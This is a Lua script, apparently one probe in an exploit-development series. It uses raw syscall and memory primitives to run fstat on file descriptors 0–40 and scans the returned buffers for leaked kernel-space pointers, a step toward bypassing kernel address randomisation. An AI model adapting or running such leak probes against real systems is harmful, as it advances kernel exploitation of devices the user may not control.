-- CRASH_CLASS: LOW
-- PROBE 1024a: every byte of struct stat, every descriptor
--
-- 1023a printed the first eight qwords and saw nothing in the supervisor range. This scans
-- the whole 0x100 bytes the kernel is allowed to write, at every byte offset, so a pointer
-- that lands on an unaligned boundary or past +0x38 is not missed.

print("=== PROBE 1024a: FSTAT FULL SCAN ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(x)
    local m = tostring(x):match("0x(%x+)")
    if m then return tonumber(m,16) end
    return to_num(x)
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function rb(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return to_num(v) end return nil end
local function hi(v) return math.floor(v/4294967296) end
local sc_fstat = mk(189); local sc_getpid = mk(20)
local buf = memory.alloc(0x200); local ba = as_addr(buf)
print(string.format("[0] pid=%d", to_num(select(2, pcall(function() return sc_getpid() end)))))
local total = 0
for fd = 0, 40 do
    for o=0,0x1F8,8 do wd(ba+o,0) end
    local ok, rv = pcall(function() return sc_fstat(uint64(fd), uint64(ba)) end)
    if ok and to_num(rv) == 0 then
        local hits, vals = {}, {}
        for o=0,0xF0,8 do
            local v = rb(ba+o)
            if v then
                vals[#vals+1] = string.format("%X", v)
                if hi(v) >= 0xFFFF8000 then hits[#hits+1] = string.format("+0x%X=%X", o, v) end
            end
        end
        if #hits > 0 then
            print(string.format("  fd %2d KP %s", fd, table.concat(hits, " ")))
            total = total + #hits
        end
        print(string.format("  fd %2d  %s", fd, table.concat(vals, " ")))
    end
end
print(string.format("[Z] total_kp=%d alive pid=%d", total, to_num(select(2, pcall(function() return sc_getpid() end)))))
print("=== COMPLETE ===")
